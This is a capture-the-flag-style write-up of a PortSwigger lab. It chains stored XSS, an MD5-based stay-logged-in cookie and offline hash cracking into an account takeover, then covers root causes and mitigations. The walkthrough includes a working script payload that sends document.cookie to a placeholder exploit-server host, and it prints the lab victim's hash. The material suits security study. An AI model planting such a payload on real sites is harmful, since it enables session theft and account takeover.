# Lab: Offline Password Cracking

## Overview

This lab demonstrates how a combination of **Stored Cross-Site Scripting (XSS)** and **weak password hashing** can lead to account takeover.

The application stores a user's username and MD5 password hash inside a Base64-encoded `stay-logged-in` cookie.

The attack involves:

1. Identifying how the `stay-logged-in` cookie is generated.
2. Exploiting a Stored XSS vulnerability to steal the victim's cookie.
3. Decoding the stolen cookie.
4. Extracting the victim's password hash.
5. Cracking the hash offline.
6. Using the recovered password to access the victim's account.

> **Note:** All testing was performed within the authorized PortSwigger Web Security Academy lab environment.

---

## Difficulty

**Practitioner**

## Vulnerabilities

- Stored Cross-Site Scripting (XSS)
- Weak Password Hashing
- Insecure Authentication Cookie
- Offline Password Cracking

## Tools

- Burp Suite Community Edition
- Burp Proxy
- Burp Decoder
- Web Browser
- PortSwigger Exploit Server
- MD5

---

## Objective

Obtain the victim's `stay-logged-in` cookie through the Stored XSS vulnerability, extract the password hash, crack it offline, and use the recovered password to access the victim's account.

---

# 1. Analyze the Stay-Logged-In Cookie

First, I logged in to my own account with the **Stay logged in** option enabled.

Using:

```text
Proxy > HTTP history
```

I inspected the response to the login request.

The application sets a cookie named:

```text
stay-logged-in
```

The cookie is Base64 encoded.

After decoding it, the structure was:

```text
username:MD5(password)
```

For example:

```text
wiener:MD5(password)
```

This shows that the authentication cookie contains a password-derived value.

### Cookie Structure

```text
Base64(
    username + ":" + MD5(password)
)
```

This is important because obtaining the cookie can potentially expose the password hash.

---

# 2. Identify the Stored XSS Vulnerability

Next, I investigated the comment functionality.

The application does not properly sanitize user-controlled comment content, allowing JavaScript to be stored and executed when another user views the affected page.

This creates a **Stored XSS** vulnerability.

The lab provides an exploit server that can be used to receive the victim's request.

---

# 3. Create the XSS Payload

I opened the provided exploit server and obtained its URL.

The following payload was used in the lab:

```html
<script>
document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie
</script>
```

The payload causes the victim's browser to navigate to the exploit server while appending the browser's cookies to the request URL.

> This payload was used only against the authorized PortSwigger Web Security Academy lab.

---

# 4. Steal the Victim's Cookie

I submitted the payload as a comment on one of the blog posts.

When the victim views the affected page, the stored JavaScript executes in the victim's browser.

The browser then sends a request to the exploit server containing the victim's cookies.

I opened:

```text
Exploit Server > Access Log
```

and inspected the incoming request.

The request contained the victim's:

```text
stay-logged-in
```

cookie.

---

# 5. Decode the Cookie

The stolen cookie was decoded using **Burp Decoder**.

The decoded value followed this structure:

```text
carlos:MD5(password)
```

The second part was an MD5 hash.

For the lab, the resulting value was:

```text
carlos:26323c16d5f4dabff3bb136f2460a943
```

The important information is:

```text
Username:
carlos

Password hash:
26323c16d5f4dabff3bb136f2460a943
```

---

# 6. Crack the Password Offline

The extracted hash can be attacked offline because it is an MD5 hash.

Unlike an online brute-force attack, offline cracking does not require repeatedly sending login requests to the target application.

The basic concept is:

```text
Candidate Password
        ↓
    MD5 Hash
        ↓
Compare with stolen hash
        ↓
Match?
        ↓
Recovered Password
```

For this lab, the password was recovered as:

```text
[REDACTED]
```

> The recovered password is intentionally not included in this public write-up.

The important lesson is that the password hash was weak enough to be recovered offline.

---

# 7. Access the Victim Account

After recovering the password, I logged in using the victim's username and recovered password.

I then navigated to:

```text
My account
```

Finally, I deleted the account to complete the lab.

---

# Attack Chain

The complete attack can be summarized as:

```text
Stored XSS
    ↓
Execute JavaScript in victim's browser
    ↓
Steal stay-logged-in cookie
    ↓
Decode Base64
    ↓
Extract MD5 password hash
    ↓
Offline password cracking
    ↓
Recover password
    ↓
Login as victim
    ↓
Account Takeover
```

---

# Key Observation

The most important finding was that multiple weaknesses could be chained together.

The Stored XSS vulnerability allowed the authentication cookie to be stolen.

The cookie itself contained a password-derived MD5 hash.

Because MD5 is a fast and unsuitable algorithm for password storage, the stolen hash could be attacked offline.

This turned a Stored XSS vulnerability into a potential account takeover.

---

# Impact

An attacker who successfully exploits this vulnerability chain could potentially:

- Steal authentication cookies.
- Obtain password hashes.
- Recover weak passwords offline.
- Bypass authentication.
- Take over user accounts.
- Access private account information.
- Perform unauthorized actions on behalf of the victim.

The severity becomes significantly higher because the vulnerabilities can be chained together.

---

# Root Cause

The vulnerability chain exists because of several security weaknesses:

### 1. Stored XSS

User-controlled comments are not properly sanitized or encoded before being rendered.

### 2. Password Hash in Authentication Cookie

The `stay-logged-in` cookie contains a value derived directly from the user's password.

### 3. Weak Hashing Algorithm

MD5 is a fast cryptographic hash function and is not suitable for password storage.

### 4. Predictable Authentication Data

The cookie structure is predictable:

```text
Base64(username + ":" + MD5(password))
```

This makes the authentication mechanism vulnerable to offline attacks if the cookie is stolen.

---

# Mitigation

## Prevent Stored XSS

- Properly encode user-controlled output.
- Sanitize HTML input where appropriate.
- Use a strong Content Security Policy (CSP).
- Avoid inserting untrusted content directly into HTML.

## Secure Authentication Cookies

- Never store password hashes inside authentication cookies.
- Do not derive authentication tokens directly from passwords.
- Use cryptographically random session tokens.
- Set appropriate cookie attributes:
  - `HttpOnly`
  - `Secure`
  - `SameSite`

## Secure Password Storage

Do not use MD5 for password storage.

Use a password hashing algorithm designed for password storage, such as:

- Argon2id
- bcrypt
- scrypt

Password hashes should also use unique salts.

---

# Skills Practiced

- Web Application Security
- Stored XSS
- Authentication Testing
- Cookie Analysis
- Burp Suite
- Burp Proxy
- Burp Decoder
- Base64 Decoding
- MD5 Hash Analysis
- Offline Password Cracking
- Attack Chain Analysis
- Account Takeover Analysis

---

# Screenshots

Recommended screenshots for this write-up:

1. Stay-logged-in cookie
2. Cookie response in Burp Proxy
3. Decoded cookie structure
4. Stored XSS vulnerability
5. Exploit Server
6. Exploit Server Access Log
7. Victim's stolen cookie
8. Burp Decoder result
9. MD5 hash analysis
10. Password cracking process
11. Victim account page
12. Successful lab completion

> Sensitive credentials, session tokens, and personal information should be redacted before publishing screenshots.

---

# Lessons Learned

- Stored XSS can become significantly more dangerous when sensitive cookies are accessible to JavaScript.
- Base64 is an encoding mechanism, not encryption.
- Authentication cookies should never contain password hashes.
- MD5 should not be used for password storage.
- Password hashes can be attacked offline without interacting with the target application.
- Vulnerabilities should be analyzed as potential attack chains rather than isolated issues.
- Secure authentication tokens should be random, unpredictable, and independent of user passwords.

---

# References

- PortSwigger Web Security Academy
- OWASP Cross Site Scripting Prevention Cheat Sheet
- OWASP Password Storage Cheat Sheet
- OWASP Session Management Cheat Sheet
- OWASP Authentication Cheat Sheet

---

# Tags

`Stored XSS` `XSS` `Authentication` `Cookie Security` `Password Cracking` `Offline Cracking` `MD5` `Burp Suite` `Account Takeover` `Web Security`